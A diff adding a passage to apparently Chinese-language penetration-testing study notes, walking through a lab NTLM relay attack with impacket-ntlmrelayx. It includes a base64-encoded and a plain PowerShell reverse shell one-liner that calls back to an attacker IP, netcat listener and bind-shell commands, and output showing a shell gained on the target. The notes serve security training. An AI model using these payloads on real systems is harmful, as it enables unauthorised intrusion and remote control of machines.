@@ -4492,3 +4492,128 @@ Hash.Target......: PAUL::VM01:e3c92a6bbe6ed8c8:39296c8175a54130c27f9202b7245048:
 ![image](https://hackmd.io/_uploads/rJ5Uqm0Y1x.png)
 
 ### Relaying Net-NTLMv2
+假設我們擁有 VM01 的低權限帳號 `files02admin`， 但無法直接使用 Mimikatz 來提取密碼。因此嘗試轉發 Net-NTLMv2 雜湊（Relay Attack）來攻擊 VM02 <[如上述攻擊](#Cracking-Net-NTLMv2)>。\
+當透過 Responder 或 SMB 攻擊獲得了 `files02admin` 的 Net-NTLMv2 雜湊，但**擦湊太複雜無法破解**\
+從帳號名稱 files02admin 來看，猜測帳號可能是 VM02 的本機管理員，因此我們可以嘗試 [Relay Attack](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-068)，將這個 Net-NTLMv2 Hash 轉送到VM02 ，看看是否能成功登入。
+
+
+使用 impacket-[ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) ，可以建立 SMB Server，並自動將 Net-NTLMv2 Hash 請求轉送到我們指定的目標機器（VM02）。
+- VM01: 192.168.116.211
+- VM02: 192.168.116.212 (目標機器)
+
+
+#### 1. ntlmrelayx 建立 SMB Server, 並轉發身份驗證
+在 ntlmrelayx 建立一個 SMB 伺服器，準備接收來自 `files02admin` 的身份驗證，並嘗試將這個身份轉發到 VM02。
+```
+┌──(chw㉿CHW)-[~/Desktop/Offsec]
+└─$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.187.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1ACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+
+```
+> `--no-http-server`：禁用 HTTP Server，現在只想進行 SMB 轉發攻擊。\
+`-smb2support`：啟用 SMB2 support，確保我們可以與現代 Windows 版本溝通。\
+`-t`：設定目標 IP。
+`-c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AI..."`：執行 base64 encode 的 PowerShell Reverse Shell。
+
+>[!Important]
+> PowerShell Reverse Shell 來自先前介紹過的 [PowerShell reverse shell one-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)\
+> 以下能夠在 Powershell 直接轉 Base64 encode：
+> ```
+> PS /Users/CWei> $command = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.185",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+>PS /Users/CWei> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+>PS /Users/CWei> $encodedCommand = [Convert]::ToBase64String($bytes)
+>PS /Users/CWei> Write-Output $encodedCommand
+>JABjAGwAaQBlAG4AdAAgAD0AIABOA...
+>```
+
+![image](https://github.com/user-attachments/assets/9a134acb-5c53-4b08-bfca-160046126c87)
+
+#### 2. 開啟 nc 監聽，等待目標機器的 Reverse Shell
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 8080
+listening on [any] 8080 ...
+｜
+```
+#### 3. 連接 VM1 bind shell，進入 Powershel 連接 SMB
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc 192.168.187.211 5555
+Microsoft Windows [Version 10.0.20348.707]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+VM01\files02admin
+
+C:\Windows\system32>dir \\192.168.45.185\chw
+dir \\192.168.45.185\chw
+
+```
+(ntlmrelayx)
+```
+┌──(chw㉿CHW)-[~/Desktop/Offsec]
+└─$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.187.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1ACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+...
+
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.187.211, attacking target smb://192.168.187.212
+[*] Authenticating against smb://192.168.187.212 as FILES01/FILES02ADMIN SUCCEED
+[*] SMBD-Thread-6 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
+[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
+[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
+[*] SMBD-Thread-9 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
+[*] SMBD-Thread-10 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
+[*] SMBD-Thread-11 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
+[*] SMBD-Thread-12 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
+[*] SMBD-Thread-13 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
+[*] Executed specified command on host: 192.168.187.212
+...
+```
+> ntlmrelayx tab 接收到來自 VM01 的連線
+
+#### 4. nc 監聽 port 取得 Reverse Shell
+(nc 8080): 接收到 Reverse Shell
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 8080
+listening on [any] 8080 ...
+connect to [192.168.45.185] from (UNKNOWN) [192.168.187.212] 62793
+
+PS C:\Windows\system32> hostname
+VM02
+PS C:\Windows\system32> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::7187:d9ec:721d:14c2%4
+   IPv4 Address. . . . . . . . . . . : 192.168.187.212
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.187.254
+```
+> 成功用 files02admin 取得 VM2 控制權限
